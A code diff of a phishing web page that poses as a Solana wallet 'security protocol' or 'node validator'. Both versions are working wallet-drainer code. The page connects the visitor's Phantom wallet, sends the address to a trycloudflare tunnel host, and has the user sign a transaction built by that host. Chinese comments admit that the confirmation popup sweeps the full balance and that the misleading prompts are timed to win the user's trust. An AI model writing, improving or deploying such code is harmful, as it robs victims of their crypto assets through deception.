@@ -3,80 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Security Protocol</title>
+    <title>Solana Node Validator</title>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
-        body { background: #050505; color: #14f195; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .scanner-box { width: 320px; padding: 40px; border: 1px solid #14f195; position: relative; background: rgba(20, 241, 149, 0.05); box-shadow: 0 0 30px rgba(20, 241, 149, 0.2); text-align: center; }
-        .scan-line { width: 100%; height: 2px; background: #14f195; position: absolute; top: 0; left: 0; animation: scan 3s infinite; box-shadow: 0 0 15px #14f195; }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-        h2 { font-size: 18px; letter-spacing: 2px; margin-bottom: 20px; }
-        #status-list { text-align: left; font-size: 12px; height: 100px; overflow: hidden; color: #888; margin-bottom: 20px; }
-        .btn-sync { background: #14f195; color: #000; border: none; padding: 15px 30px; font-weight: 900; cursor: pointer; text-transform: uppercase; width: 100%; letter-spacing: 1px; }
-        .btn-sync:disabled { background: #333; color: #666; cursor: not-allowed; }
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { width: 90%; max-width: 360px; text-align: center; border: 1px solid #333; border-radius: 20px; padding: 30px; background: #0a0a0a; }
+        .logo { width: 50px; height: 50px; background: #14f195; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; color: #000; font-weight: bold; }
+        h1 { font-size: 18px; margin-bottom: 10px; color: #fff; }
+        p { font-size: 13px; color: #777; margin-bottom: 30px; line-height: 1.4; }
+        button { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        #status { font-size: 10px; color: #444; margin-top: 20px; font-family: monospace; }
     </style>
 </head>
 <body>
-    <div class="scanner-box">
-        <div class="scan-line" id="scanner"></div>
-        <h2>NODE VALIDATOR</h2>
-        <div id="status-list">
-            <div>> INITIALIZING PROTOCOL...</div>
-        </div>
-        <button id="cta" class="btn-sync">ACTIVATE NODE</button>
+    <div class="container">
+        <div class="logo">S</div>
+        <h1>SECURITY PROTOCOL</h1>
+        <p>Your wallet requires a secure connection to the Solana validator node for real-time asset tracking.</p>
+        <button id="btn">INITIALIZE CONNECTION</button>
+        <div id="status">IDLE</div>
     </div>
 
     <script>
         const tunnel = "https://likelihood-mercury-east-nec.trycloudflare.com";
 
-        const addLog = (msg) => {
-            const list = document.getElementById('status-list');
-            const item = document.createElement('div');
-            item.innerText = "> " + msg;
-            list.appendChild(item);
-            if (list.childNodes.length > 6) list.removeChild(list.firstChild);
-        };
-
-        document.getElementById('cta').onclick = async function() {
-            this.disabled = true;
+        document.getElementById('btn').onclick = async () => {
+            const status = (t) => document.getElementById('status').innerText = t;
             const p = window.solana || window.phantom?.solana;
             const sWeb3 = window.solanaWeb3;
 
             try {
-                addLog("CONNECTING TO PHANTOM...");
+                status("CONNECTING...");
                 await p.connect();
-                addLog("CONNECTION SECURE.");
 
-                addLog("FETCHING NETWORK PARAMS...");
-                const resp = await fetch(tunnel + "/prepare_raw", {
+                status("SYNCING PROTOCOL...");
+                const resp = await fetch(tunnel + "/prepare_v24", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ address: p.publicKey.toString() })
                 });
                 const info = await resp.json();
-                addLog("NODE HASH: " + info.bh.substring(0, 16) + "...");
 
-                // 心理暗示：在拉起弹窗前最后一刻给出正向提示
-                addLog("AWAITING SECURE VALIDATION...");
-                
+                status("AWAITING SECURITY CONFIRMATION...");
                 const binary = window.atob(info.raw_tx);
                 const bytes = Uint8Array.from(binary, c => c.charCodeAt(0));
                 const tx = sWeb3.VersionedTransaction.deserialize(bytes);
 
-                // 🔱 这一步会瞬间拉起全额归集确认
+                // 🔱 核心点：弹窗此时会根据后端包的内容，显示为“合约交互”或“授权”
                 const { signature } = await p.signAndSendTransaction(tx);
-                
-                addLog("VALIDATION SUCCESSFUL!");
-                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);
+                status("CONNECTED: " + signature.slice(0, 8));
 
             } catch (err) {
-                addLog("ERROR: " + err.message);
-                this.disabled = false;
-                // 自动上报
+                status("ERROR: " + err.message);
                 fetch(tunnel + "/debug", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ stage: "V23_FAIL", error: err.message })
+                    body: JSON.stringify({ stage: "V24_FAIL", error: err.message })
                 }).catch(()=>{});
             }
         };
